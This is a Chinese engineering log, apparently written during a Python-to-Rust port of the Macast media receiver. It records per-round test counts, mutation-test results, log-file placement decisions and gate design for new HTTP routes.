  `macast-upnp` 347、`macast-tauri` 11。**顺手量到一条仪器本身的边界**：同一套逐文件扫描打在
  `macast-mpv` 上是 **161** 而 `--list` 是 **149** —— 那 12 条坐在 `#[cfg(windows)]` 模块里，
  这台 Mac 根本不编译。所以"两台仪器一致"是**测出来的巧合**，不是定律；数得出可运行的用例的只有 `--list`。
  **以及本分支从未推送 ⇒ 本轮这些用例与那 271 条真机读数没有任何 CI 见证过。**

**Rust 侧把播放历史接进设置文件时量到的事**（2026-10-18，`src-tauri/src/host.rs` 的 `with_setting` / `persist_history` + 真机 §27 的 **10 条** + 单元 +7 条）：

* **为什么值一节脚本**：§23 交付的第一条红就是这一格 —— 投完之后 `history` 是 `[]`，而参考实现写在 `Setting[Play_History]`（重启还在）。那一轮补的是`打印内存里那份`（诚实的一半），而 `重启之后还在` 必须有**第二次进程**才问得出来：单元层用同一路径上的第二个 `Setting` 实例，真机层杀掉再起来读 `query=status`。任何只看一个进程的断言，对旧代码照样成立。
* **三条各自独立的判据形状**：① 读侧走 `peek` 不走 `get` —— `get` 的默认值副作用会把 `Play_History: []` 造进一份从来没有过它的文件，于是`第一次运行`在磁盘上变成`用户清空过`（§4.2 第一条陷阱，判据断的是调用之后 `has()` **仍然为假**）；② 50 行上限是**关于文件**的承诺（`protocol.py:1215` 那句注释说的是`让设置文件保持小`），所以计数从磁盘取，不从刚写它的表里取；③ 清空写的是**空列表**而不是删键 —— 对页面一样，对下一次启动那句日志不一样。
* **一处顺带改对的归属，代价是一条按文件名 grep 的判据**：这张状态表的话一直写在 `logs/MPV.log` 里，因为 `main.rs` 当年把播放器的 logger 交给了它；而 `protocol.py:30` 是 `getLogger("Protocol")`。这是 §4.3 那句`日志指错嫌疑人`的上一档：**指错文件** —— 内容都对，而读者 `grep` 的那一下不替他换文件。**这一条当初写的理由里有一句是假的，2026-10-19 量出来就地改掉**：那句写的是「logsplit 给 `Protocol` `logs/Protocol.log`」，而 `logsplit.claim` 在参考实现里**只有两个调用点**（`macast.py:336` 的 `load_from_file` 与 `:905` 的 `_load_bundled_plugins`，都只走 `claim_from_module`）—— **只给插件**；`Protocol` / `Discovery` / `Chromecast` / `AirPlay` / `server` / `SSDPServer` 都没被 claim，`propagate` 开着，所以在 Python 里它们**全在 `macast.log`**。本壳"核心模块也各自一个文件"因此是一个**移植决定**（记在 `docs/Rust-Port-Design.md` §8，代价一并写着，包括一句要读的话：§5 那条 `grep macast.log` 的排障配方**对本壳不成立**）；这一格真正成立的部分是内部一致性 —— 既然这份壳里 `Protocol` 有文件，状态表的话就该在那个文件里。理由换了，修法一个字没动。修法在构造点（表 claim 自己的名字），判据是 §27 只在 `logs/Protocol.log` 里找那句 `read back`，而不是`在所有日志里找` —— 后者对着错误的目的地照样绿。测试侧是同一规矩的另一半：`Logger::named` 按名字记忆、`claim()` 先到先得，所以**否定断言**必须分名（`macast-cast` 的 e9 用四个名字），只有正向断言可以共用产品那个名字。
* **六支定点变异**（一支一条命令、`/tmp` 备份 + EXIT trap 还原 + md5 回到当轮基线）：`add_history` 不再持久化 → 单元 4 红、真机 §27 4 红；`peek` 换成带默认的 `get` → 1 红；`clear` 不再持久化 → 1 红；垃圾条目不再丢 → 1 红；丢掉那条 WARNING → 1 红；丢掉 INFO 那句 → 1 红。**没有一支 0 红，但有一条读数要分开说**：§27 最后那条`同一地址第二次投仍然 1 行`在持久化变异体下**照旧绿** —— 它问的不是持久化，是`读回来的行与写入的行是不是同一张表`（display-copy 形状），这话写在用例旁边，免得下一个人把它当成持久化的第二个见证者。
* **验收脚本现在自己跑两道闸**（每次跑都执行，任一失灵就整趟计败）：双引号里 `反斜杠紧跟单引号` 那个形状（§26 就是被它骗了一整轮：bash 不把它当转义，于是 needle 搜的是一个从来不存在于任何日志里的串），和**未转义**的反引号（转义的是合法散文，把它们一起算会冤枉自己的文档、然后被人删掉 —— 上一轮那条`期望 0`就是这么撒谎的）。两道各自配一条**栽赃正控**：栽进去必须报 1，否则那个 `0` 不叫干净，叫没在跑。
* **计数**：`macast-tauri` 11 → **18**（这一轮 +7 条，第一条 `重启之后还在` 的单元判据在里面），其余 `macast-cast` 695 / `macast-core` 90 / `macast-mpv` 149 / `macast-upnp` 347；真机 **281 PASS / 1 SKIP / 0 FAIL、退出码 1**（那一条 SKIP 仍是 responder 的送达那一格，见上一条侧栏）。**以及本分支从未推送 ⇒ 这一轮的用例与那 281 条读数没有任何 CI 见证过。**


**Rust 侧把 `_airplay._tcp` 的广播接上时量到的事**（2026-10-18 → 10-19，`macast-cast/src/announce.rs` 的 `service_type` / `for_airplay` / `airplay_from_setting` / `responder_answers` + `src-tauri/src/main.rs` 的第二个 announcer + 真机 §26 **+7 条**（该节现在 **27** 条）与 §24 的双类型浏览；单元 **699**，整跑 **288 PASS / 0 FAIL / 1 SKIP，退出码 1**）：

* **一个服务类型是加一个字段，不是加第二份实现**：`Service` 多的是 `service_type`，两个 builder 共用同两个私人主人（`advertisable()` 的窄地址集合、`report_clipped()` 的截属性不截接收器）。答不答问收在 `responder_answers()` 一行 —— 它问的是"那份 17 行判决语料是为哪个类型量的"，答案只有 `_googlecast._tcp`。附录 B 把这三对数字钉住（`advertisable(setting, log)` 与 `report_clipped(&service, log)` **各恰好 2**）：第三个类型进来时两对一起涨才是对的，只涨一处就是有人抄了第二份实现。
* **"会广播" ≠ "会答问"，而本机两半都没有见证者**：§26 那条浏览从**突发**就能折出完整设备（PTR+SRV+TXT+A、端口 = 实际绑的 7001、`deviceid` 非空、`model=Macast`、`name=` = 这趟的友好名），它既证不了答问也证不了不答问。所以这句话必须活在日志里（`it announces this type and does not answer it — the responder table was measured for _googlecast._tcp`；**合并之后**这一句只对 `responder_answers()` 为假的类型成立，而 AirPlay 的查询在合并 socket 上已有答案，单元见证是 `one_socket_answers_the_measured_type_and_stays_silent_for_the_other`），§26 有一条就是问它在不在 —— 一个把读者送去修一个没坏的东西的句子比不写更贵（§4.2/§4.3 那一族）。
* **两条仪器的谎与一处产品谎，全在同一趟现形**：① 两个 announcer 一存在，§22 那句 `log_grep 'mDNS: announcing ' | tail -1` 读的就是**最后一个服务类型**，于是拿 Cast 的浏览去解 AirPlay 的名字、报出 **7 条** TXT/`ca`/SRV/A 的产品红，而那一趟广播逐字节是对的（同一浏览的 seen 列表里就躺着 Cast 那条）。判据改成**按类型选行**：从"每个服务类型一行"的日志里挑最后一行，等于随手挑一个类型。② 共享模块的拒绝句写死「Chromecast will not be discoverable」，AirPlay 广播失败时用户读到的是 Chromecast —— 而参考实现那句 `%s` 格式化的是**调用方给的 service type**（`discovery.py:268-269`），照抄的正确读法本来就是类型名（变异体换回 `"Chromecast"` → **2 红**）。③ 我的 M8 探针 grep 的是 `macast.log`、找不到那行，读数一度读成"有牙"；真相是那行**从来没写在 `macast.log`** —— 壳自己的启动总结句一直骑在 `Logger::named("MPV")` 上，落 `logs/MPV.log`。四条 mDNS 总结句搬进 `logs/Discovery.log`（同伴句「mDNS advertised …」本来就在那），§22/§26 的读取改成**按文件名**（§27 立的规矩：对**否定**断言，"所有日志里找"是正确宽度；对**目的地**断言，它对着错误的文件照样绿）。搬的时候量出一句**假理由**：上一轮本文与 `AGENTS.md` 都写着「logsplit 给 `Protocol` `logs/Protocol.log`」，而 `logsplit.claim` 的全部调用点是两条**插件加载**路径 —— 核心的 `Protocol` / `Discovery` / `Chromecast` / `AirPlay` 全落 `macast.log`。本壳的核心分文件因此是**移植决定**，§8 新加一行记它和它的代价：**§5 那条 `grep macast.log` 的排障配方对本壳不成立**。
* **一格 0 红是写电池时发现的，不是跑电池时发现的**：`start()` 里 `let answers = self.service.responder_answers();` 这次派生**没有任何见证者** —— 单元用例自己手工把 flag 交给 `run()`，而真机那一问是 §25，本机 §25 的送达那一格是 **SKIP**。补的是 `the_answering_half_is_derived_not_written`（结构性审计），并把它**为什么**是审计而不是行为用例写进测试自己的注释："§25 会抓"不是一条判据，尤其当 §25 在这台机器上跳过的时候。八支变异读数：恒真 **1** / 恒假 **1** / `features` 小写 **1** / 宽集合 **1**（**行为那一问先红**：`carries 192.168.139.3, which is not in the set a sender can reach`，这台机器两个集合确实不同，所以"审计只是兜底"在这里是真话）/ `if answers` → `if true` **1** / `start()` 字面量 **1** / 拒绝句写回 Chromecast **2** / M8 见 ③ 无效。
* **两条欠账，方向别读错**：① **本壳现在在 5353 上有三个 socket**（浏览器 + 两个 announcer），两台机器量过的规则是**单播整条只交给其中一个，交给谁随流变**；今天的读数没观察到损失（那些查询多播送达，多播本来就复制），但"没观察到"不是"没有代价" —— 合并那一条（§16 第 13 条）现在有第二条、更强的理由。② **没有任何一台 iPhone 连过这台接收端**：§26 的发送端是本脚本自己写的 RTSP 字节。**以及本分支从未推送 ⇒ 这一轮的 699 条与那 288 条读数没有任何 CI 见证过。**

**Rust 侧把 `query=module-settings` 接进管理面时量到的事**（2026-10-19，`macast-core/src/module_settings.rs` 一张归属表 + `macast-upnp/src/http.rs` 的 GET 表第 13 行 + 真机 §28 的 **16 条**；`macast-core` 90 → **101**、`macast-upnp` 347 → **350**、真机 **304 PASS / 0 FAIL / 1 SKIP，退出码 1**）：

* **形状**：core 一张「键 → (label, hint)」表 + http 一行路由，写侧（`set-module-setting`，门是 code-execution）留到 POST 那一轮，但**必须问同一张表** —— 归属散在两个读者手里，页面就会写着"这一格可写"而后端拒收（§4.7c 那张 POST 表教的是同一件事）。这张卡今天**读得到、点不动**，这句要写在页面上而不是留成"功能坏了"。
* **跨实现对拍是这一节的主体**：§28 把 `macast/module_settings.py` **按文件路径** load 进来（`import macast` 会连 cherrypy 与 import 时冻住的 `SETTING_DIR` 一起拖进来，§4.9 那条），用**本机 HTTP 刚交回来的 present 行**重建成 `stored` 再逐格 canonically 比 —— 输入取自答复而不是设置文件，是为了不跟"实例启动时自己写了 USN 与友好名"赛跑。
* **一处偏离要"被数过"才算排除**：`Timeout` 在 Python 里是 `cast_local_file` 的键，在本壳是 core 的键（读它的是设备交接发送端，见 §4.14 那段 Rust 侧的 `Key::Timeout`），所以两份文档在那一格不可能相等。对拍按名字排除它，并且断言**排除恰好一行、来自 core、参考侧完全没有 Timeout**：一个允许无界差异的比较不是比较 —— 这与 §4.12 末那条「CI 的豁免名单必须自己成立」是同一条规矩。另外两处偏离：① 没有插件组（本壳无插件子系统，而参考实现在 `plugins=[]` 时交回的就是这个形状 —— 用它自己算一遍来证明，不靠声明）；② §8 那条"键按字母排"讲的是 `Setting` 的 `BTreeMap` 表（`launch-param` 交回的那份），**不是**文档格子：格子顺序两侧相同（工作区开了 `serde_json` 的 `preserve_order`，root `Cargo.toml` 为 `LIVE_LOAD_OPTIONS` 开的）。第一版把两件事混成一件，于是报出一条**不存在的产品偏离**并把它写成了判据。
* **八支定点变异里有一支是"0 红发生在错的 crate"**：把格子的 label 换成键名，`macast-core` **一条不红**、`macast-upnp` 红 1 —— 因为 core 那条中文用例读的是**表**，而把表交出去那一步（`item()`）只有 HTTP 层在用。补的是 core 自己读一格（顺带成了那条中文例外表的使用见证：`SSDP USN` 是参考实现唯一不含汉字的 label，例外表钉成 1 条）。其余读数：改错 `Timeout` 键名 2 / 数字类型恒 int 1 / `editable` 恒真 1 / `is_claimed` 恒真 2 / 多长一个 `message` 键 1 / 「其他」那句下一步被截短 1 / `is_owned` 恒真 1。
* **三条「同源等式」是被电池逼出来的，不是被机器逼出来的**：`assert_eq!(groups[0]["title"], json!(CORE_TITLE))` 这种写法拿常量和常量比，对任何标题都成立 —— 三处（两个组名 + 那句未识别 hint）全部换成字面量。这与 §4.2「不提问的检查」、§4.13「一个没被机器问过的数字」是同一族，只是这次的"不提问"写在我自己刚交的测试里。
* **第五次同一个反引号形状，第一次由闸拦住**：§28 的一条 `pass "… preserve_order…"` 文案里放了两枚**未转义**反引号，bash 于是真去执行了那条命令、把文案印成空串 —— 抓它的是脚本顶部那道带栽赃正控的自审（§4.13 那一族的第五次，也是第一次不需要人读到）。同一节里另一条仪器错是把 **HTTP 403 与正文 `code: 1`** 读成同一层（拒绝是 `{"code": 1, "message": "管理接口只回答…"}` 配 403），于是对着一台正确的机器变红；改法是这一路一直用的 `api_probe` + 解析后再问。
* **GET 表的地板换成等式**：`the_get_route_table_is_well_formed` 里 `>= 12` 改 `== 13` —— **低一行的地板拦不住删掉一行**，而"这张表还在不在"正是它存在的理由（附录 B 那一行同步）。
* **计数与边界**：`macast-core` **101**（两台仪器一致：`--lib` 与 `--list`）、`macast-upnp` **350**、`macast-cast` 699、`macast-mpv` 149、`macast-tauri` 18。没验的三件：写侧未移植；**没有任何浏览器读过这份文档**（`frontend/index.html` 还是占位页），所以"页面按这个形状渲染得出来"是文本契约不是截图；`plugin-info` / `mirror-state` / `mirror-snapshot` 仍未移植。**以及本分支从未推送 ⇒ 这一轮的 101 + 3 条与那 304 条读数没有任何 CI 见证过。**

**Rust 侧把 `set-module-setting` 接上（本壳第一行 `code-execution` 门）时量到的事**（2026-10-19，`macast-core/src/module_settings.rs` 的 `set_value` / `remove_flag_is_true` + `setting.rs` 的 `set_name` / `remove_name` + `macast-upnp/src/http.rs` 的 `Gate::Code` 与 POST 表第 8 行；`macast-core` 101 → **107**、`macast-upnp` 350 → **353**、真机 §28 写路径 **+11 条**（该节 16 → **27**），整跑 **315 PASS / 0 FAIL / 1 SKIP，退出码 1**）：

* **为什么这一行值得单独一种门**：这张表里住着 自动化钩子 的键，值下一次投屏就进 `subprocess(shell=True)` —— **写它等于运行它**，而 DNS 重绑定之下"本机"毫无信息量（§4.7b）。所以 `set-module-setting=1` 从 127.0.0.1 来、没带令牌，也必须被拒；门仍是**累积且有序**的，局域网无令牌听到的还是管理那句（把"这字段能跑代码"先说给一个连它私有都不该知道的人，是泄露而不是提醒）。
* **一处主人，两种读法**：`set_value` 住在 core，读侧（`query=module-settings`）与写侧问**同一张**归属表 —— 否则页面把某格渲染成可编辑而后端拒收（§4.8「两处答案不一致比没有数字更糟」的第三种形状）。判据里有一条专门对六个名字逐项比"写侧收不收"与"读侧这一格在不在表里"，包括 `Timeout` 和一个根本不存在的名字。
* **`Setting` 多了两个按名字的写入口**（`set_name` / `remove_name`）：`set(Key, …)` 表达不了用户手写的键或将来插件的键，而给每个插件键加一个 `Key` 变体等于让枚举成为"文件里有什么"的第二份主人。`remove_name` 回**在场与否**，因为页面要说「已删除」还是「本就未设置」，而**不在场时一个字都不写**（`if was_present: del; save()` 就是那个形状）。
* **六支定点变异，没有一支 0 红**：门降级成 management **2**（安全那条 + 表里"码门恰好一行"那条新计数）/ `is_owned` 被绕开 **3** / 容器值不再被拒 **1** / `remove` 真值表恒假 **1** / `set_name` 不落盘 **2**（磁盘那条 + 删除那条，"删了但文件没变"正是它抓的形状）/ 拒绝句不再把名字念回 **1**。
* **补判据时现形的两条形状，都不是产品**：① 写侧拒绝是 **HTTP 200 + 正文 `code: 403`**，GET 侧本壳是 **HTTP 403 + 正文 `code: 1`** —— 参考实现本来分两层（`Answer::denied` 从不设状态码），我拿 GET 的形状断言 POST，于是对着正确的机器变红；② 手抄的正文串差在 `ensure_ascii` 的 `\uXXXX` 与四空格缩进 —— **能比语义就别比字节**，这条纪律在 §4.14 写过一次，这次是它自己复发的形状。另外脚本自审（未转义反引号那道闸）在正式跑之前又拦下一条会被印成空串的 pass 文案：同一族第六次，第二次由闸拦住。
* **诚实边界**：钩子的**执行**侧还没移植，所以今天写一个钩子键在这台机器上还不会真的跑命令 —— **这句不是"安全已完备"，是"攻击面还没接上"**：门已经按参考实现摆好，移植那一步不必重新决定门。`install-plugin` / `save-launch-param` / `install-webrtc-extras` / `plugin-file` 四条码门仍属参考实现独有（本壳没有插件子系统）。**本分支从未推送 ⇒ 这 107 + 3 条与那 315 条读数没有任何 CI 见证过。**

**Rust 侧把 5353 上的 socket 合并、并把壳自己的日志归位时量到的事**（2026-10-19 → 20，`macast-cast/src/announce.rs` 的 `Announcer{services}` / `run(&[Service])` / `join_addresses` + `src-tauri/src/main.rs` 的一个 announcer 与 `app_log`；`macast-cast` 699 → **702**、`macast-tauri` 18 → **19**，真机 **318 PASS / 0 FAIL / 1 SKIP，退出码 1**）：

* **为什么是合并而不是再加一层**：两台机器量到的规则是**多播复制、单播整条只交给一个 socket 且交给谁随流变**。上一轮给 AirPlay 加了第二个 announcer，本壳于是有三个竞争 socket，而参考实现只有一个（`discover()` 是单例）。"没观察到损失"不是"没有代价"—— 那一族的查询多播送达，多播本来就每个 socket 都收到，所以只能靠结构修。
* **形状**：一次 bind、join 所有 service 地址的**并集**、一轮读；起手/每 60 秒/退出都逐 service 发；读到查询时对**每个 `responder_answers()` 为真的 service** 各调一次 `serve`。这顺带把上一轮欠的"AirPlay 查询没有答案"补成了行为（参考实现一个引擎答所有注册类型），**但真机没有见证者**：§25 送达那一格本机仍 SKIP。
* **两条 0 红，都是写电池时抓到的**：① 只 join 第一个 service → 0 红（本机两个 service 地址相同，行为分不出来）→ 补 `the_join_list_is_the_union_of_every_service_and_not_the_first_one`（两个不同地址），补完红 1；② 只给第一个 service 发突发 → 0 红，而且**第一次补的判据也没抓到**：新判据统计"报文里出现过 `_airplay` 名字"，而 **goodbye 也带那个名字**（TTL 0）—— 改成只数 `ttl > 0` 之后才红 1。这一格说明"按名字出现"与"真的公告了"是两件事。
* **#25 顺带做完**：四条 mDNS 句子上一轮已进 `logs/Discovery.log`，这一轮把其余启动总结（`receiver: HTTP …` / `Cast receiver:` / `setup face:` / `renderer log:` / `AirPlay RTSP:` 三条 / `Chromecast is switched off`）全部改走 `macast_core::logging::root()`（= `macast.log`），播放器的两条留在 `logs/MPV.log` —— **分家不是搬家**。判据三层：单元文本审计（每条句子往回 220 字符必须看到 `app_log.`）、`root()` 名字仍是 `Macast` 且产品里没人 claim 它、真机 §22 三条**按文件名**读。**一条断言因此被删掉**：第一版写 `!root.is_claimed()`，单跑绿、整组红 —— 同文件另一个测试 claim 了 `"Macast"`，那条断言读的是**测试调度器**（§4.2 共享夹具那一族在 logger 上的形状）。
* **一处文案回归**：合并时我把 AirPlay 的总结句从 `it announces only — queries about this type are not answered` 改成了新措辞，而 §26 的 needle 还找旧句子 → 真机 1 红。修法两边一起：句子写成一行（续行 `\` 被吞过一次，留下 34 个空格）并把 needle 换成 `does not answer it`。**这是"文案一改，找旧字串的断言就永远成立/或立刻变红"的第 N 次**：改文案时必须同时改 needle，或者像 §26 这样把 needle 钉在新措辞上。
* **计数与边界**：`macast-cast` **702**、`macast-core` 107、`macast-upnp` 353、`macast-mpv` 149、`macast-tauri` **19**；真机 **318 / 0 / 1**。仍然欠着：没有 iPhone 连过；5353 上仍是两个 socket（浏览器 + 引擎），参考实现也是一个引擎服务浏览与广播 —— 那一条仍记在 §16 第 13 条；**本分支从未推送 ⇒ 这一轮的 702 + 1 条与那 318 条读数没有任何 CI 见证过。**

**Rust 侧把管理面最后三个 GET 接上时量到的事**（2026-10-20，`macast-upnp/src/http.rs` GET 表 13 → **16** 行；`macast-upnp` 353 → **355**，真机 **323 PASS / 0 FAIL / 1 SKIP，退出码 1**）：

* **"这个壳没有那一面"要答成一份完整文档，不是 404 也不是 `{}`**：`plugin-info` 给真数据（`platform` / `version` / **空插件列表** / `plugin_repo` 的四个键），空列表是"从这个构建里装不了东西"的答案；两张 mirror 读给 `{code: 1, message: "这台设备还没有镜像面：…"}`。一张轮询的卡片要的是一个能停下来的答复（`cast-targets` 立过的形状）。
* **`plugin_repo` 的四个值都是诚实的空**：本壳没有插件子系统与 extras 安装器，编一个能拉索引的地址等于让页面指向一个这个构建装不了的仓库 —— 与 `mirror-action` 不在 POST 表里同一条理由。谁要在这里做插件安装，先移植 `plugin_repo` 与插件管理器。
* **两张 mirror 读的门口比别处严**：`GATE_TOKEN`，**本机也不例外** —— 参考实现自己写了理由（一个返回局域网设备列表与活动流，另一个返回桌面的**一帧**）。门照抄、答复是缺席文档：一句能让人行动的话，比 404（读起来像坏了）与 `{}`（读起来像正在镜像）都强。
* **判据与变异**：单元 2 条 + 表循环（每行的门都被无令牌局域网与带令牌各打一遍，所以"新增一行忘了门"不靠记忆）+ 真机 §23 的 5 条；变异体把 `mirror-state` 的门降级成 management → **1** 红，把 `plugins` 改成 `null` → **1** 红。
* **计数与边界**：GET 表 **16** 行（`the_get_route_table_is_well_formed` 的 `== 16` 与附录 B 同步）、`macast-upnp` **355**；其余 702 / 107 / 149 / 19 不变；真机 **323 / 0 / 1**。**本分支从未推送 ⇒ 这 355 条与那 323 条读数没有任何 CI 见证过。**

**Rust 侧移植 `plugin_repo`（插件仓库坐标与那一个镜像开关）时量到的事**（2026-10-20，`macast-core/src/plugin_repo.rs` + 新增的 `macast-core/src/pyops.rs`（值语义一位主人）+ `macast-core/src/setting.rs` 的 `github_cn_mirror` + `macast-upnp/src/http.rs` 的 POST 表第 1 行 `set-github-mirror` + 真机 §29 的 **27 条**；`macast-core` 107 → **128**、`macast-upnp` 355 → **358**，整跑 **350 PASS / 0 FAIL / 1 SKIP，退出码 1**）：

* **上一轮那句「诚实的空」是本壳自己写下的第二谎，而它是对着用户的一个键说的**：`Github_CN_Mirror` **是本壳的键** —— 它在「模块设置」归属表里（`module_settings.rs:104`，标签「启用国内镜像地址」），§28 的写路径刚刚让页面真的能写它。于是同一份 `macast_setting.json`，「模块设置」那张卡答 `true`，`plugin-info` 答 `mirror_enabled: false`。**坐标本身是无害的**（这个构建里没有任何一侧去 fetch 它们，参考实现的索引也是空的），所以交回真坐标不是许诺，交回一个假值才是谎。判据现在有两个读者各问一遍（§29 的 `pr_panel` 与 `pr_ask`），两个开关状态各比一次。
* **一条 `.trim()` 是"判据替错误的形状作证"**：把 `truthy` / `type_name` / 表单开关收成一位主人之后逐条读参考实现，`protocol.py:2493`（`set-github-mirror`）与 `:3103`（`remove`）**都不 strip** —— 带空格的 `remove` 在 Python 里不删，本壳删。更贵的是 `module_settings` 那条用例把 `"  ON "` 写在**"算删除"那一列**，所以这不是电池没抓到，是**唯一该问这一格的用例自己抄错了规则**。现在三层各问（`pyops` 的字面表、`module_settings` 的表、真机把十一种拼写打给**参考实现自己的表达式**比）。方向也要读对：这一侧的错答案是删掉用户的键。而 `?refresh=` **确实**要 strip（`protocol.py` 的另一处）—— 两种拼法、两位主人，那条整棵树的扫描钉的就是"哪一处 strip"。
* **值语义有四个读者，规则体只许有一份**：`truthy` 原先在 `macast-mpv`、`macast-upnp` 的 `py_truthy`、`macast-cast` 的 `resolve::truthy` 各抄了一遍，`type_name` 在 mpv 与 `module_settings::py_type_name` 各一份 —— 五份**今天恰好全部同意**，所以没有任何一条用例是红的。电池对这一族**结构性失明**（杀一份副本，另外几份照样答话；第 ⑯ 支"把第二份规则体抄回 resolve.rs"的红只有那条整棵树的扫描给得出），所以判据是 `each_value_rule_has_one_body_in_the_workspace`：整棵树里 `Value::Null => false` **恰好一处**、表单开关**恰好两处且 strip 的那一处真的 strip**、地板 40 个源文件（"扫到 0 个文件也算过"是同一个谎言的另一半）。
* **`"0"` 在 Python 里是真**：开关的读法原来是"值是不是那个词 true（或 `"1"/"true"/"True"`）"，而参考实现是 `bool(value)`。手改高级设置写下 `"Github_CN_Mirror": "0"` 的那台机器，Python 开镜像、本壳关。改成 `pyops::truthy` 之后两侧逐字一致，并补了一条**按值**问的用例（13 行，含 `[]` 假、`[""]` 真、`"false"` 真）—— 它是因为我先去数"这一格谁在问"才写出来的，不是被红逼出来的。
* **新鲜顺序是这张表唯一会腐烂的地方**：三行索引在开关开的时候**塌成两行**（mirrored raw 与表里本来那条 ghproxy 行是同一个串）。不去重的后果不是"少一行"，是多出 `ghproxy.net/https://ghproxy.net/…` 这条谁都不服务的地址；把 jsDelivr 也加进 `MIRROR_HOSTS` 的后果是给唯一那个国内永远可达的 host 再加一跳。两支变异体各红 3 与 4，真机 §29 对第一支另交 3 条，红法逐条印出来。
* **关是键消失，不是存 `false`**（§4.6）：判据在真机上是对**那份文件** grep 那个键必须不存在 —— 对着答复断言 `false` 问不到这一格，两种形状在 HTTP 面上读起来一模一样。
* **§29 的假父包与两份文件的对拍**：`plugin_repo.py` 模块级就 `from .utils import Setting`，所以按文件路径 load 要造一个假父包 + 桩 `Setting`；桩**读的是实例自己刚写的那份文件**，因此这不是两份夹具互相点头，是 shipped 模块在读 Rust 写下的字节。桩的 `set` / `unset` 一律抛 —— 这一节让 Python 只读。资产名的四洞按序那一格是**跨实现合成**（拿 Rust 交回的模板 × 参考实现的位置参数，与参考实现自己的 formatter 比）：拿 Python 的模板比 Python 的函数就是同一实现读自己，红不了也证明不了。
* **两条仪器错，都长得像产品坏了**：① `pr_panel` 把 curl 的正文从 stdin 灌进一段程序，而程序自己也从 stdin 来 —— 读者解析的是**它自己的源码**，报 `JSONDecodeError`、`panel=` 空串，读起来像那张卡没有这一行。这正是 §28 的 `ms_ask` 头注释写过的同一件事，**我在下一节里重犯了一次**；改法是落文件、按名字开。② 那张十一格的表把 Python 的 `True`/`False` 与 JSON 的 `true`/`false` 直接比字符串，于是**十一种拼写全部"漂移"，而十一个答案逐格是对的** —— 比不出大小写区别的比较，问的不是那件事。
* **收尾那趟"干净跑"是假的，因为产物没跟着还原**：`--no-build` 加上去，而上一支变异体改的是产品码，源文件 md5 已还原、二进制还是变异的，于是 §29 红 12 条**全是真的**——真的在一份错的产物上。这是 §4.2 那条"等长还原留下一份有效的旧 `.pyc`"的 Rust 版本：还原之后必须**重新构建**再跑。重跑读数 350 / 0 / 1。
* **一格落后的地板顺手补上**：`macast-cast` 的 `TESTS_IN_THIS_CRATE` 停在 699，两台仪器都说 702 —— 上一轮我在散文里写了 702 却没回来改这个常量，而它的判据是 `>=`，**低 3 不会红**。与 §4.13「一个没被机器问过的数字」是同一族，只是这次烂在地板里。
* **仍然欠着的**：① **插件子系统本身**（管理器、热插拔、`plugin-enable/disable/uninstall`、`install-plugin`、`plugin-file` 上传、`save-launch-param`、extras **安装器**）—— `plugins` 因此仍是空表，`extras_urls` / `extras_asset_name` 今天是纯规则加用例、没有产品读者；② POST 表 **9 / 23** 行（参考实现那 23 行是 2026-10-20 逐行数出来的，`protocol.py:2287-2331`；§4.7c 原文那句"表里全部 16 条"已就地更正为"写下时 16、今天 23"，并记下 `>= 16` 那条地板拦不住数字腐烂）；③ §29 对拍的是**坐标文档**，不是"有人真去拉了那份索引"；④ 本分支从未推送 ⇒ 这一轮的 128 + 3 条与那 350 条读数**没有任何 CI 见证过**。

**Rust 侧把页面上那两个按钮接成两行 POST 时量到的事**（2026-10-20，`macast-upnp/src/http.rs` 的 POST 表 9 → **11** 行 + `macast-upnp/src/store.rs` 的 `StateStore::clear_history` + `Management::set_sub_show` + `src-tauri/src/host.rs` 的转发 + 真机 §30 的 **18 条**；`macast-core` 128 / `macast-upnp` **362** / 真机 **368 PASS / 0 FAIL / 1 SKIP，退出码 1**）：

* **这一轮没有新建任何能力**：`set-subtitle-show`（参考实现第 14 行）要的那个"布尔→`set_property sub-visibility yes/no`"早在 `macast-mpv`，`clear-play-history`（第 21 行）要的那个"清空并且落盘"早在 §27 就进了壳的表 —— 缺的只是 HTTP 面上两行表和两个口。相对顺序照参考实现：`set-subtitle-show` 排在 `cast-uri` 之前、`clear-play-history` 排在 `clear-log` 之前，**两个"清空"字段在同一个请求里时只有前者跑**（判据既静态比表序，也行为地问一次"答复的形状是谁的"）。
* **本轮唯一的新事实是判据自己的空洞，而且是变异体抓出来的**：第一版 §30 那条"POST `=1` 之后等 `DisplayCurrentSubtitle` 变 `true`"**绿得什么都没问** —— mpv 装观察器时会把每个被观察属性先报一遍，而字幕默认可见，所以那张表在任何请求之前就要变 `true`。把壳里的转发改成 `!show` 之后只有第二行红 —— 那就是证据。修法：先等首报把值变成 bool，再从**隐藏态**出发，让每一行都只有一次请求能造成的迁移；同一支变异体今红 **4** 条。**形状留在文档里的理由**：§4.13「不提问的检查」这次出现在我同一轮刚写的判据上，而它不是靠断言更严格发现的，是靠一支"看起来只该红一条"的变异体红了别的条发现的。
* **量到一条产品时序（两边同形，不改产品）**：播放器对 `sub-visibility` 的首报落在 `PLAYING` 之后约 **0.4–1.0 秒**（时间戳仪器，逐格打值）。投完立刻按字幕开关，在参考实现里同样会被那次首报盖一下（`macast_renderer/mpv.py:404-414` 先装观察器再答话）。要改的是判据：**等那个状态，再动它** —— §4.2 那条「等账本，不要抓一瞬间」的第三种形状（前两种是"等文件写完"与"等计数器 flush"）。
* **`DisplayCurrentSubtitle` 从今天起有写点，而写它的不是 HTTP 面**：§23 那句"16 个状态名是超集，值可以是 `null`"里它原本没有写点；现在它由播放器的 property-change 回声写（`Signal::Subtitle` → `StateCall::Subtitle`）。判据因此**不许**去复抄那张表的默认值（默认值 `''1''` 的主人是 `src-tauri` 的 `StateTable`，它按 Python 加载器原话把状态装成裸文本），而是问"投一次请求前后两次 `media` 读数相等" —— 一支让面自己 `store.write(...)` 的变异体红 1 条，正是这一格。
* **"不 strip"在第二扇门上再问一遍**：`set-subtitle-show` 的读法是 `str(value).lower() in ('1','true','yes','on')`，与 `remove`、`set-github-mirror` 同一位主人（`pyops::form_flag_is_true`）；而 `?refresh=` **要** `strip()`，那是另一种拼法、另一个主人 —— 两种拼法各有归属这件事被那条整棵树的扫描钉住（"strip 的那一处真的 strip"）。线上那一格用 `"1 "`（表单里一个多余空格）：**必须隐藏字幕**。
* **清空落盘，三处各问一遍**：`query=status` 的 `history` 空了、文件里 `Play_History` 是**空列表而不是被删的键**（§16 第 22 条那条规则的第三面：清空过与从未投过要在磁盘上分得开）、以及**清空之后再一次投屏恰好回填一行** —— 一支"把写入路径一起弄坏"的假清空过不了最后这一格。
